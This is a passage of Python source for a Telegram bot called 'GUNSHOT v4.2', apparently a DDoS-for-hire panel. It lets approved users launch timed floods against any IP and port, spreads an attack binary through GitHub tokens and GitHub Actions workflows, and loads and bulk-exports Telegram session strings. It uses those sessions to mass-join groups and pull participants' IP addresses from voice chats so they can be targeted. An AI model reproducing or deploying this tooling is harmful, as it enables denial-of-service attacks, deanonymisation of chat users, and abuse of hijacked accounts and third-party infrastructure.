        except Exception as e: await status.edit_text(f"❌ {str(e)[:200]}")
        return

# ============ SESSION COMMANDS ============
@Client.on_message(filters.command("addsession") & approved_only)
async def cmd_addsession(c, m):
    if len(m.command) < 2: await m.reply_text("📖 /addsession &lt;string&gt;"); return
    w = await m.reply_text("⏳ Connecting...")
    try:
        s = m.command[1].strip()
        ss = StringSession(s)
        tmp = TelegramClient(StringSession(s), API_ID, API_HASH, connection_retries=2, timeout=15)
        await asyncio.wait_for(tmp.connect(), timeout=20)
        if not await tmp.is_user_authorized():
            await tmp.disconnect(); await w.edit_text("❌ Not authorized"); return
        me = await tmp.get_me(); await tmp.disconnect()
        fname = os.path.join(SESSION_DIR, str(me.id))
        if any(getattr(cl.session, 'filename', '').endswith(str(me.id)) for cl in sessions.values()):
            await w.edit_text(f"⚠️ Already loaded: {me.first_name}"); return
        sq = SQLiteSession(fname); sq.set_dc(ss.dc_id, ss.server_address, ss.port)
        sq.auth_key = ss.auth_key; sq.save()
        cl = TelegramClient(fname, API_ID, API_HASH, connection_retries=2, timeout=15)
        await asyncio.wait_for(cl.connect(), timeout=20)
        if not await cl.is_user_authorized():
            await cl.disconnect(); await w.edit_text("❌ Verification failed"); return
        sid = max(sessions.keys()) + 1 if sessions else 1
        sessions[sid] = cl
        await w.edit_text(
            f"<b>✅ S{sid} ADDED</b>\n\n👤 {me.first_name} <code>{me.id}</code>\n📊 Sessions: {len(sessions)}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📦 Sessions", callback_data="sess_menu")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]]))
    except Exception as e: await w.edit_text(f"❌ {str(e)[:120]}")

@Client.on_message(filters.command("delsession") & approved_only)
async def cmd_delsession(c, m):
    try: sid = int(m.command[1])
    except: await m.reply_text("📖 /delsession &lt;sid&gt;"); return
    if sid not in sessions: await m.reply_text(f"❌ S{sid} not found", reply_markup=back_kb()); return
    await kill_session(sid, sessions[sid])
    await m.reply_text(f"✅ S{sid} deleted", reply_markup=back_kb())

@Client.on_message(filters.command("sessions") & approved_only)
async def cmd_sessions(c, m):
    if not sessions: await m.reply_text("📭 No sessions", reply_markup=back_kb()); return
    sids = sorted(sessions.keys())
    msg = f"<b>📦 SESSIONS ({len(sessions)})</b>\n\n🔢 S{sids[0]} → S{sids[-1]}\n\n"
    msg += " • ".join(f"S{i}" for i in sids[:50])
    if len(sids) > 50: msg += f" …+{len(sids)-50}"
    await m.reply_text(msg, reply_markup=back_kb())

@Client.on_message(filters.command("clearsessions") & owner_only)
async def cmd_clearsessions(c, m):
    if not sessions: await m.reply_text("❌ No sessions"); return
    await asyncio.gather(*[s.disconnect() for s in sessions.values()], return_exceptions=True)
    sessions.clear(); entity_cache.clear()
    shutil.rmtree(SESSION_DIR, ignore_errors=True); os.makedirs(SESSION_DIR, exist_ok=True)
    await m.reply_text("✅ Cleared all", reply_markup=admin_kb())

@Client.on_message(filters.command("exportsessions") & owner_only)
async def cmd_exportsessions(c, m):
    if not sessions: await m.reply_text("❌ No sessions"); return
    w = await m.reply_text("⏳ Exporting...")
    try:
        zp = "export.zip"; sids = sorted(sessions.keys())
        with zipfile.ZipFile(zp, 'w', zipfile.ZIP_DEFLATED) as zf:
            for sid in sids:
                sf = getattr(sessions[sid].session, 'filename', None)
                if not sf: continue
                if not sf.endswith('.session'): sf += '.session'
                if os.path.exists(sf): zf.write(sf, os.path.basename(sf))
        await c.send_document(m.chat.id, zp, caption=f"📦 {len(sids)} sessions\nS{sids[0]}→S{sids[-1]}")
        os.remove(zp); await w.delete()
    except Exception as e: await w.edit_text(f"❌ {str(e)[:150]}")

# ============ JOIN/LEAVE/GETIP ============
@Client.on_message(filters.command("join") & approved_only)
async def cmd_join(c, m):
    if len(m.command) < 3: await m.reply_text("📖 /join &lt;sid|all&gt; &lt;chat&gt;"); return
    sid_arg, chat = m.command[1], " ".join(m.command[2:])
    if sid_arg.lower() == 'all':
        if not sessions: await m.reply_text("❌ No sessions"); return
        w = await m.reply_text(f"⏳ Joining {len(sessions)}...")
        sem = asyncio.Semaphore(15)
        async def jt(s, cl):
            async with sem:
                try:
                    await connect_c(cl); ent = await resolve_entity(cl, chat, s)
                    await cl(JoinChannelRequest(ent))
                    return f"✅ S{s}: joined"
                except Exception as ex: return f"❌ S{s}: {str(ex)[:50]}"
        res = await asyncio.gather(*[jt(s, cl) for s, cl in dict(sessions).items()])
        await w.delete(); await send_chunks(m.chat.id, res)
    else:
        try: sid = int(sid_arg)
        except: await m.reply_text("❌ Invalid sid"); return
        if sid not in sessions: await m.reply_text(f"❌ S{sid} not found"); return
        w = await m.reply_text("⏳ Joining...")
        try:
            await connect_c(sessions[sid]); ent = await resolve_entity(sessions[sid], chat, sid)
            await sessions[sid](JoinChannelRequest(ent))
            await w.edit_text(f"✅ S{sid} joined")
        except Exception as e: await w.edit_text(f"❌ {str(e)[:100]}")

@Client.on_message(filters.command("leave") & approved_only)
async def cmd_leave(c, m):
    if len(m.command) < 3: await m.reply_text("📖 /leave &lt;sid|all&gt; &lt;chat&gt;"); return
    sid_arg, chat = m.command[1], " ".join(m.command[2:])
    if sid_arg.lower() == 'all':
        if not sessions: await m.reply_text("❌ No sessions"); return
        w = await m.reply_text(f"⏳ Leaving {len(sessions)}...")
        sem = asyncio.Semaphore(15)
        async def lt(s, cl):
            async with sem:
                try:
                    await connect_c(cl); ent = await resolve_entity(cl, chat, s)
                    asyncio.create_task(cl(LeaveChannelRequest(ent)))
                    return f"✅ S{s}: left"
                except Exception as ex: return f"❌ S{s}: {str(ex)[:50]}"
        res = await asyncio.gather(*[lt(s, cl) for s, cl in dict(sessions).items()])
        await w.delete(); await send_chunks(m.chat.id, res)
    else:
        try: sid = int(sid_arg)
        except: await m.reply_text("❌ Invalid sid"); return
        if sid not in sessions: await m.reply_text(f"❌ S{sid} not found"); return
        w = await m.reply_text("⏳ Leaving...")
        try:
            await connect_c(sessions[sid]); ent = await resolve_entity(sessions[sid], chat, sid)
            asyncio.create_task(sessions[sid](LeaveChannelRequest(ent)))
            await w.edit_text(f"✅ S{sid} left")
        except Exception as e: await w.edit_text(f"❌ {str(e)[:100]}")

@Client.on_message(filters.command("getip") & approved_only)
async def cmd_getip(c, m):
    if len(m.command) < 3: await m.reply_text("📖 /getip &lt;sid&gt; &lt;chat&gt;"); return
    try: sid = int(m.command[1])
    except: await m.reply_text("❌ Invalid sid"); return
    if sid not in sessions: await m.reply_text(f"❌ S{sid} not found"); return
    await do_extract_ip(m.from_user.id, " ".join(m.command[2:]), str(sid), m)

# ============ STATUS/STOP ============
@Client.on_message(filters.command("status"))
async def cmd_status(c, m):
    if not can_attack(m.from_user.id): await m.reply_text("⛔"); return
    if not active_attacks: txt = "📡 <b>STANDBY</b>\n\n🟢 IDLE"
    else:
        txt = f"<b>📡 ACTIVE ({len(active_attacks)})</b>\n\n"
        for i, (aid, d) in enumerate(active_attacks.items(), 1):
            el = int(time.time() - d['start_time']); bar = progress_bar(el, d['time'])
            txt += f"{i}. <code>[{bar}]</code> {el}s/{d['time']}s\n   <code>{d['ip']}:{d['port']}</code>\n\n"
    await m.reply_text(txt, reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh", callback_data="status"),
         InlineKeyboardButton("🛑 Stop All", callback_data="stop")],
        [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]]))

@Client.on_message(filters.command("stop"))
async def cmd_stop(c, m):
    if not can_attack(m.from_user.id): await m.reply_text("⛔"); return
    if not active_attacks: await m.reply_text("✅ No active", reply_markup=back_kb()); return
    n = len(active_attacks)
    for aid in list(active_attacks.keys()): finish_attack(aid)
    await m.reply_text(f"🛑 Terminated {n}.", reply_markup=back_kb())

# ============ ADMIN ============
@Client.on_message(filters.command("approve") & owner_only)
async def cmd_approve(c, m):
    if len(m.command) < 2: await m.reply_text("📖 /approve &lt;id&gt; &lt;days&gt;"); return
    try:
        tid = int(m.command[1].strip())
        days = int(m.command[2]) if len(m.command) > 2 else 7
    except: await m.reply_text("❌ Invalid args"); return
    pending_users.pop(str(tid), None); save_json('pending_users.json', pending_users)
    approved_users[str(tid)] = {"added_by": m.from_user.id, "days": days, "date": datetime.now().isoformat()}
    save_json('approved_users.json', approved_users)
    await m.reply_text(f"✅ <code>{tid}</code> approved ({days}d)", reply_markup=admin_kb())
    try: await c.send_message(tid, "✅ Access granted. /start")
    except: pass

@Client.on_message(filters.command("remove") & owner_only)
async def cmd_remove(c, m):
    if len(m.command) < 2: await m.reply_text("📖 /remove &lt;id&gt;"); return
    try: tid = int(m.command[1])
    except: await m.reply_text("❌ Invalid"); return
    if str(tid) in approved_users:
        del approved_users[str(tid)]; save_json('approved_users.json', approved_users)
        await m.reply_text(f"✅ Removed {tid}", reply_markup=admin_kb())
    else: await m.reply_text("❌ Not found", reply_markup=admin_kb())

@Client.on_message(filters.command("users") & owner_only)
async def cmd_users(c, m):
    if not approved_users: await m.reply_text("📭 None", reply_markup=admin_kb()); return
    msg = "<b>👥 USERS</b>\n\n"
    for uid, d in approved_users.items():
        msg += f"<code>{uid}</code> – {d.get('days','?')}d – 💥{attack_counters.get(uid,0)}\n"
    await m.reply_text(msg, reply_markup=admin_kb())

@Client.on_message(filters.command("pending") & owner_only)
async def cmd_pending(c, m):
    if not pending_users: await m.reply_text("📭 None", reply_markup=admin_kb()); return
    msg = "<b>⏳ PENDING</b>\n\n"
    for uid, d in pending_users.items():
        msg += f"<code>{uid}</code> @{d.get('username','?')}\n   <code>/approve {uid} 7</code>\n\n"
    await m.reply_text(msg, reply_markup=admin_kb())

@Client.on_message(filters.command("broadcast") & owner_only)
async def cmd_broadcast(c, m):
    if len(m.command) < 2: await m.reply_text("📖 /broadcast &lt;msg&gt;"); return
    txt = m.text.split(None, 1)[1] if len(m.command) > 1 else ""
    if not txt: await m.reply_text("❌ Empty"); return
    sent = 0
    for uid in list(owners.keys()) + list(approved_users.keys()):
        try: await c.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{txt}"); sent += 1
        except: pass
    await m.reply_text(f"✅ Sent to {sent}", reply_markup=admin_kb())

@Client.on_message(filters.command("maintenance") & owner_only)
async def cmd_maintenance(c, m):
    if len(m.command) != 2: await m.reply_text("📖 /maintenance on|off"); return
    mode = m.command[1].lower()
    save_json('maintenance.json', {"maintenance": mode == "on"})
    await m.reply_text(f"🔧 Maintenance {'ON' if mode=='on' else 'OFF'}", reply_markup=admin_kb())

@Client.on_message(filters.command("myid"))
async def cmd_myid(c, m):
    await m.reply_text(f"🆔 <code>{m.from_user.id}</code>", reply_markup=back_kb())

@Client.on_message(filters.command("about"))
async def cmd_about(c, m):
    await m.reply_text(
        "<b>🔫 GUNSHOT v4.2</b>\n\nPyrogram + Telethon + PyGithub\n"
        "GitHub Actions + Telegram IP Extractor\n"
        "💾 Binary cache: smart auto-apply\n\n<i>\"Silence. Precision. Power.\"</i>",
        reply_markup=back_kb())

# ============ CALLBACKS ============
@Client.on_callback_query()
async def cb_handler(c, q):
    global cached_binary, cached_binary_size, cached_binary_time
    try:
        data = q.data; uid = q.from_user.id

        if data == "back_start":
            if not can_attack(uid): await q.answer("⛔", show_alert=True); return
            role = "👑 OWNER" if is_owner(uid) else "✅ APPROVED"
            total = sum(attack_counters.values()); mine = attack_counters.get(str(uid), 0)
            await safe_edit(q,
                f"<b>🔫 GUNSHOT v4.2</b>\n\n👤 @{q.from_user.username or '?'}\n👑 {role}\n"
                f"🔄 Tokens: {len(github_tokens)}\n📦 Sessions: {len(sessions)}\n"
                f"💾 Binary: {binary_status_str()}\n"
                f"💥 Kills: {mine}\n🌐 Global: {total}\n\n<i>Select 👇</i>",
                main_kb(uid))

        elif data == "atk_start":
            if not can_attack(uid): await q.answer("⛔", show_alert=True); return
            auto_remove_expired()
            if not github_tokens:
                await safe_edit(q, "❌ <b>No tokens!</b>\nAdd with /addtoken", back_kb()); return
            user_states[uid] = {'flow': 'attack', 'step': 'ip'}
            await safe_edit(q,
                "🎯 <b>MANUAL ATTACK</b>\n\n<b>Step 1/3:</b> Send <b>IP address</b>\n\nExample: <code>1.1.1.1</code>",
                cancel_kb("atk_cancel"))

        elif data == "atk_cancel":
            user_states.pop(uid, None)
            await q.answer("Cancelled")
            await safe_edit(q, "❌ Cancelled", back_kb())

        elif data == "ip_start":
            if not can_attack(uid): await q.answer("⛔", show_alert=True); return
            if not sessions:
                await safe_edit(q,
                    "❌ <b>No sessions!</b>\n\nAdd:\n<code>/addsession &lt;string&gt;</code>\nOr upload .zip",
                    InlineKeyboardMarkup([
                        [InlineKeyboardButton("📦 Sessions", callback_data="sess_menu")],
                        [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]])); return
            user_states[uid] = {'flow': 'ip_extract', 'step': 'chat'}
            await safe_edit(q,
                "🌐 <b>EXTRACT IP</b>\n\n<b>Step 1/2:</b> Send <b>group link or ID</b>\n\n"
                "Examples:\n"
                "<code>https://t.me/groupname</code>\n"
                "<code>@groupname</code>\n"
                "<code>-1001234567890</code>\n"
                "<code>https://t.me/+invitelink</code>\n\n"
                "<i>Group must have active voice chat</i>",
                cancel_kb("ip_cancel"))

        elif data == "ip_cancel":
            user_states.pop(uid, None)
            await q.answer("Cancelled")
            await safe_edit(q, "❌ Cancelled", back_kb())

        elif data.startswith("sess_pick_"):
            st = user_states.get(uid)
            if not st or st.get('flow') != 'ip_extract' or st.get('step') != 'session':
                await q.answer("❌ Expired. Restart.", show_alert=True); return
            chat_link = st.get('chat')
            sid_str = data.replace("sess_pick_", "")
            await q.answer("Extracting...")
            await do_extract_ip(uid, chat_link, sid_str, q.message)

        elif data == "sess_auto":
            st = user_states.get(uid)
            if not st or st.get('flow') != 'ip_extract' or st.get('step') != 'session':
                await q.answer("❌ Expired. Restart.", show_alert=True); return
            chat_link = st.get('chat')
            await q.answer("Trying all sessions...")
            await do_extract_ip(uid, chat_link, 'auto', q.message)

        elif data.startswith("use_ip_"):
            if uid not in pending_ip:
                await q.answer("❌ No IP. Extract first.", show_alert=True); return
            p = pending_ip[uid]
            if data == "use_ip_custom":
                user_states[uid] = {'flow': 'custom_time', 'ip': p['ip'], 'port': p['port']}
                await safe_edit(q,
                    f"⏱ <b>Custom Duration</b>\n\nTarget: <code>{p['ip']}:{p['port']}</code>\n\n"
                    f"Send <b>duration</b> (5-7200s)",
                    cancel_kb("atk_cancel"))
            else:
                dur = int(data.replace("use_ip_", ""))
                await q.answer(f"Launching {dur}s...")
                await safe_edit(q, f"🚀 <b>Launching</b>\n\n<code>{p['ip']}:{p['port']}</code> for {dur}s")
                await perform_attack(uid, p['ip'], p['port'], dur, q.message)

        elif data == "status":
            if not can_attack(uid): await q.answer("⛔"); return
            if not active_attacks: txt = "📡 <b>STANDBY</b>\n\n🟢 IDLE"
            else:
                txt = f"<b>📡 ACTIVE ({len(active_attacks)})</b>\n\n"
                for i, (aid, d) in enumerate(active_attacks.items(), 1):
                    el = int(time.time() - d['start_time']); bar = progress_bar(el, d['time'])
                    txt += f"{i}. <code>[{bar}]</code> {el}s/{d['time']}s\n   <code>{d['ip']}:{d['port']}</code>\n\n"
            await safe_edit(q, txt, InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="status"),
                 InlineKeyboardButton("🛑 Stop All", callback_data="stop")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]]))

        elif data == "stop":
            if not can_attack(uid): await q.answer("⛔"); return
            if not active_attacks: msg = "✅ No active"
            else:
                n = len(active_attacks)
                for aid in list(active_attacks.keys()): finish_attack(aid)
                msg = f"🛑 Terminated {n}"
            await safe_edit(q, msg, back_kb())

        elif data == "my_tokens":
            if not can_attack(uid): await q.answer("⛔"); return
            mine = [t for t in github_tokens if t.get('added_by') == uid]
            msg = "<b>🔑 YOUR TOKENS</b>\n\n" if mine else "📭 None"
            for i, t in enumerate(mine, 1):
                msg += f"{i}. @{t.get('username','?')} – <code>{t['token'][:10]}…</code>\n"
            if cached_binary:
                msg += f"\n💾 Binary cache: {cached_binary_size//1024} KB"
            await safe_edit(q, msg, InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Add Token", callback_data="addtoken_help")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]]))

        elif data == "addtoken_help":
            note = ""
            if cached_binary:
                note = f"\n\n💾 Binary cache: <b>{cached_binary_size//1024} KB</b> — auto-applied to new tokens"
            else:
                note = "\n\n⚠️ No binary cached — ask owner to /binary_upload"
            await safe_edit(q,
                f"<b>🔑 ADD TOKEN</b>\n\n<code>/addtoken ghp_xxxx</code>\n\n"
                f"Scopes: <b>repo</b> + <b>workflow</b>\n"
                f"Create: https://github.com/settings/tokens/new{note}", back_kb())

        elif data == "sess_menu":
            if not can_attack(uid): await q.answer("⛔"); return
            sids = sorted(sessions.keys())
            body = f"<b>📦 SESSIONS ({len(sessions)})</b>\n\n"
            if sids: body += f"🔢 S{sids[0]} → S{sids[-1]}\n\n"
            body += (
                "<b>Commands:</b>\n"
                "<code>/addsession &lt;string&gt;</code>\n"
                "<code>/delsession &lt;sid&gt;</code>\n"
                "<code>/join &lt;sid|all&gt; &lt;chat&gt;</code>\n"
                "<code>/leave &lt;sid|all&gt; &lt;chat&gt;</code>\n"
                "<code>/getip &lt;sid&gt; &lt;chat&gt;</code>\n"
                "📤 Send .zip to bulk load")
            btns = []
            if is_owner(uid):
                btns.append([InlineKeyboardButton("📤 Export", callback_data="sess_export"),
                             InlineKeyboardButton("🗑️ Clear", callback_data="sess_clear")])
            btns.append([InlineKeyboardButton("🌐 Extract IP", callback_data="ip_start")])
            btns.append([InlineKeyboardButton("🔙 Menu", callback_data="back_start")])
            await safe_edit(q, body, InlineKeyboardMarkup(btns))

        elif data == "sess_export" and is_owner(uid):
            if not sessions: await q.answer("❌ No sessions", show_alert=True); return
            await q.answer("Generating...")
            try:
                zp = "export_cb.zip"; sids = sorted(sessions.keys())
                with zipfile.ZipFile(zp, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for sid in sids:
                        sf = getattr(sessions[sid].session, 'filename', None)
                        if not sf: continue
                        if not sf.endswith('.session'): sf += '.session'
                        if os.path.exists(sf): zf.write(sf, os.path.basename(sf))
                await c.send_document(q.message.chat.id, zp, caption=f"📦 {len(sids)} sessions")
                os.remove(zp)
            except Exception as e: await q.answer(f"❌ {str(e)[:80]}", show_alert=True)

        elif data == "sess_clear" and is_owner(uid):
            await safe_edit(q, f"⚠️ Clear ALL {len(sessions)} sessions?", InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑️ YES", callback_data="sess_clear_do")],
                [InlineKeyboardButton("❌ No", callback_data="admin_panel")]]))

        elif data == "sess_clear_do" and is_owner(uid):
            await asyncio.gather(*[s.disconnect() for s in sessions.values()], return_exceptions=True)
            sessions.clear(); entity_cache.clear()
            shutil.rmtree(SESSION_DIR, ignore_errors=True); os.makedirs(SESSION_DIR, exist_ok=True)
            await safe_edit(q, "✅ All cleared", admin_kb())

        elif data == "help_menu":
            await safe_edit(q,
                "<b>🔫 QUICK HELP</b>\n\n"
                "🚀 <b>Manual Attack</b> — IP → Port → Time\n"
                "🌐 <b>Extract IP</b> — Group → Session → Attack\n"
                "🔑 <b>Add Token</b> — /addtoken\n"
                "💾 <b>Binary</b> — owner /binary_upload once → auto for all\n"
                "📦 <b>Sessions</b> — /sessions\n\n"
                "Full: /help", back_kb())

        elif data == "about_menu":
            await safe_edit(q,
                "<b>🔫 GUNSHOT v4.2</b>\n\nPyrogram + Telethon + PyGithub\n"
                "💾 Smart binary cache\n\n<i>\"Silence. Precision. Power.\"</i>", back_kb())

        elif data == "my_id":
            await safe_edit(q, f"🆔 <code>{uid}</code>", back_kb())

        elif data == "admin_panel":
            if not is_owner(uid): await q.answer("⛔", show_alert=True); return
            bin_ind = "✅" if cached_binary else "❌"
            await safe_edit(q, f"⚙️ <b>ADMIN PANEL</b>\n\n💾 Binary: {bin_ind} {binary_status_str()}", InlineKeyboardMarkup([
                [InlineKeyboardButton("🔐 All Tokens", callback_data="admin_tokens"),
                 InlineKeyboardButton("🧹 Health", callback_data="admin_checktokens")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users"),
                 InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
                [InlineKeyboardButton("📦 Sessions", callback_data="sess_menu"),
                 InlineKeyboardButton("🗑️ Clear Tokens", callback_data="admin_clear_confirm")],
                [InlineKeyboardButton("📤 Binary Upload", callback_data="admin_binary"),
                 InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast_help")],
                [InlineKeyboardButton("🗑️ Clear Binary Cache", callback_data="admin_clearbin")],
                [InlineKeyboardButton("🔧 Maintenance", callback_data="admin_maintenance_help")],
                [InlineKeyboardButton("🔙 Main Menu", callback_data="back_start")]]))

        elif data == "admin_tokens" and is_owner(uid):
            rm = auto_remove_expired()
            if not github_tokens: msg = "📭 Empty"
            else:
                msg = "<b>🔐 TOKENS</b>\n\n"
                for i, t in enumerate(github_tokens, 1):
                    msg += f"{i}. @{t.get('username','?')} – <code>{t['token'][:10]}…</code>\n"
                msg += f"\nTotal: {len(github_tokens)}"
                if rm: msg += f"\n🧹 Removed: {rm}"
            msg += f"\n💾 Binary: {binary_status_str()}"
            await safe_edit(q, msg, admin_kb())

        elif data == "admin_checktokens" and is_owner(uid):
            rm = auto_remove_expired()
            msg = f"<b>🔍 HEALTH</b>\n\nTotal: {len(github_tokens)}\nRemoved: {rm}\n💾 Binary: {binary_status_str()}\n\n"
            for i, t in enumerate(github_tokens[:10], 1):
                ok, info, _ = validate_token(t['token'])
                msg += f"{i}. @{t.get('username','?')}: {'✅' if ok else '⚠️'}\n"
            if len(github_tokens) > 10: msg += f"…+{len(github_tokens)-10}"
            await safe_edit(q, msg, admin_kb())

        elif data == "admin_users" and is_owner(uid):
            if not approved_users: msg = "📭 None"
            else:
                msg = "<b>👥 USERS</b>\n\n"
                for u2, d in approved_users.items():
                    msg += f"<code>{u2}</code> – {d.get('days','?')}d – 💥{attack_counters.get(u2,0)}\n"
            await safe_edit(q, msg, admin_kb())

        elif data == "admin_pending" and is_owner(uid):
            if not pending_users: msg = "📭 None"
            else:
                msg = "<b>⏳ PENDING</b>\n\n"
                for u2, d in pending_users.items():
                    msg += f"<code>{u2}</code> @{d.get('username','?')}\n<code>/approve {u2} 7</code>\n\n"
            await safe_edit(q, msg, admin_kb())

        elif data == "admin_clear_confirm" and is_owner(uid):
            await safe_edit(q, f"⚠️ Delete <b>{len(github_tokens)} tokens</b>?", InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑️ YES", callback_data="admin_clear_do")],
                [InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]))

        elif data == "admin_clear_do" and is_owner(uid):
            n = len(github_tokens); github_tokens.clear(); save_json('github_tokens.json', github_tokens)
            await safe_edit(q, f"🗑️ Cleared {n}", admin_kb())

        elif data == "admin_binary" and is_owner(uid):
            state = binary_status_str()
            await safe_edit(q,
                f"<b>📤 BINARY</b>\n\nCurrent cache: {state}\n\n"
                f"<code>/binary_upload</code> — upload new binary\n"
                f"New tokens will auto-get it.\n\n"
                f"<i>Cache clears on restart.</i>", admin_kb())

        elif data == "admin_clearbin" and is_owner(uid):
            if not cached_binary:
                await q.answer("📭 No binary cached", show_alert=True); return
            await safe_edit(q, "⚠️ Clear binary cache?\nNew tokens won't auto-get binary.", InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑️ YES", callback_data="admin_clearbin_do")],
                [InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]))

        elif data == "admin_clearbin_do" and is_owner(uid):
            cached_binary = None; cached_binary_size = 0; cached_binary_time = None
            await safe_edit(q, "🗑️ Binary cache cleared", admin_kb())

        elif data == "admin_broadcast_help" and is_owner(uid):
            await safe_edit(q, "<b>📢 BROADCAST</b>\n\n<code>/broadcast &lt;msg&gt;</code>", admin_kb())

        elif data == "admin_maintenance_help" and is_owner(uid):
            await safe_edit(q, "<b>🔧 MAINTENANCE</b>\n\n<code>/maintenance on</code>\n<code>/maintenance off</code>", admin_kb())

        else:
            await q.answer("❓")
    except Exception:
        logger.error(traceback.format_exc())
        try: await q.answer("❌ Error", show_alert=True)
        except: pass

# ============ TEXT HANDLER ============
@Client.on_message(filters.text & filters.private & ~filters.command([
    "start","help","attack","status","stop","addtoken","mytokens","removetoken",
    "tokens","checktokens","cleartokens","binary_upload","clearbinary","cancel","addsession",
    "delsession","sessions","clearsessions","exportsessions","join","leave","getip",
    "approve","remove","users","pending","broadcast","maintenance","myid","about"]))
async def text_handler(c, m):
    uid = m.from_user.id
    st = user_states.get(uid)
    if not st: return
    if not can_attack(uid): user_states.pop(uid, None); return
    txt = (m.text or "").strip()

    if st['flow'] == 'attack':
        if st['step'] == 'ip':
            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', txt) or any(int(o) > 255 for o in txt.split('.')):
                await m.reply_text("❌ Invalid IP. Example: <code>1.1.1.1</code>", reply_markup=cancel_kb()); return
            st['ip'] = txt; st['step'] = 'port'
            await m.reply_text(f"✅ IP: <code>{txt}</code>\n\n<b>Step 2/3:</b> Send <b>port</b> (1-65535)", reply_markup=cancel_kb())
        elif st['step'] == 'port':
            try:
                p = int(txt)
                if not (1 <= p <= 65535): raise ValueError
            except:
                await m.reply_text("❌ Port 1-65535", reply_markup=cancel_kb()); return
            st['port'] = p; st['step'] = 'time'
            await m.reply_text(f"✅ Port: <code>{p}</code>\n\n<b>Step 3/3:</b> Send <b>duration</b> (5-7200s)", reply_markup=cancel_kb())
        elif st['step'] == 'time':
            try:
                t = int(txt)
                if not (5 <= t <= 7200): raise ValueError
            except:
                await m.reply_text("❌ Time 5-7200s", reply_markup=cancel_kb()); return
            ip, port = st['ip'], st['port']
            user_states.pop(uid, None)
            await m.reply_text(f"🚀 Launching {ip}:{port} for {t}s...")
            await perform_attack(uid, ip, port, t, m)

    elif st['flow'] == 'ip_extract':
        if st['step'] == 'chat':
            st['chat'] = txt; st['step'] = 'session'
            sids = sorted(sessions.keys())
            if not sids:
                user_states.pop(uid, None)
                await m.reply_text("❌ No sessions available", reply_markup=back_kb()); return
            rows = []
            for i in range(0, min(len(sids), 10), 2):
                row = [InlineKeyboardButton(f"📱 S{sids[i]}", callback_data=f"sess_pick_{sids[i]}")]
                if i+1 < min(len(sids), 10):
                    row.append(InlineKeyboardButton(f"📱 S{sids[i+1]}", callback_data=f"sess_pick_{sids[i+1]}"))
                rows.append(row)
            rows.append([InlineKeyboardButton("🎲 Auto (try all)", callback_data="sess_auto")])
            rows.append([InlineKeyboardButton("❌ Cancel", callback_data="ip_cancel")])
            await m.reply_text(
                f"✅ Group: <code>{txt[:60]}</code>\n\n<b>Step 2/2:</b> Pick <b>session</b>\n\n"
                f"<i>Auto tries each until success</i>",
                reply_markup=InlineKeyboardMarkup(rows))

    elif st['flow'] == 'custom_time':
        try:
            t = int(txt)
            if not (5 <= t <= 7200): raise ValueError
        except:
            await m.reply_text("❌ Time 5-7200s", reply_markup=cancel_kb()); return
        ip, port = st['ip'], st['port']
        user_states.pop(uid, None)
        await m.reply_text(f"🚀 Launching {ip}:{port} for {t}s...")
        await perform_attack(uid, ip, port, t, m)

# ============ INLINE QUERY ============
@Client.on_inline_query()
async def inline_query(c, q):
    try:
        uid = q.from_user.id
        if not is_owner(uid):
            await q.answer([InlineQueryResultArticle(
                title="❌ Owner only",
                input_message_content=InputTextMessageContent("Access denied"))], cache_time=0); return
        parts = q.query.strip().split(maxsplit=1)
        if len(parts) < 2 or not sessions:
            await q.answer([InlineQueryResultArticle(
                title="❌ Usage: <sid> <chat>",
                input_message_content=InputTextMessageContent("No sessions"))], cache_time=0); return
        try: sid = int(parts[0])
        except:
            await q.answer([InlineQueryResultArticle(
                title="❌ Invalid sid",
                input_message_content=InputTextMessageContent("sid must be number"))], cache_time=0); return
        if sid not in sessions:
            await q.answer([InlineQueryResultArticle(
                title=f"❌ S{sid} not found",
                input_message_content=InputTextMessageContent(f"Available: {list(sessions.keys())}"))], cache_time=0); return
        try:
            ip, port, title = await getip_task(sid, sessions[sid], parts[1].strip())
            await q.answer([InlineQueryResultArticle(
                title=f"✅ {title} — {ip}:{port}",
                description=f"/attack {ip} {port} 30",
                input_message_content=InputTextMessageContent(
                    f"🛜 <b>IP Extracted</b>\n\nSession: S{sid}\nChat: {title}\n"
                    f"IP: <code>{ip}</code>\nPort: <code>{port}</code>"))], cache_time=0)
        except Exception as ex:
            await q.answer([InlineQueryResultArticle(
                title=f"❌ {str(ex)[:40]}",
                input_message_content=InputTextMessageContent(f"❌ S{sid}: {str(ex)[:100]}"))], cache_time=0)
    except Exception: logger.error(traceback.format_exc())

# ============ MAIN ============
async def main():
    global pyro
    try:
        import uvloop
        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    except: pass
    log("🚀 Starting GUNSHOT v4.2...")
    log(f"✅ Owners: {list(owners.keys())}")
    log(f"✅ Tokens: {len(github_tokens)}")
    log(f"✅ Approved: {len(approved_users)}")
    log(f"💾 Binary cache: {'EMPTY' if not cached_binary else 'LOADED'}")
    await load_all_sessions()
    pyro = Client("gunshot_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, parse_mode=enums.ParseMode.HTML)
    await pyro.start()
    me = await pyro.get_me()
    log(f"✅ Bot: @{me.username}")
    log("🎉 Running!")
    await asyncio.Event().wait()

if __name__ == "__main__":
    main()
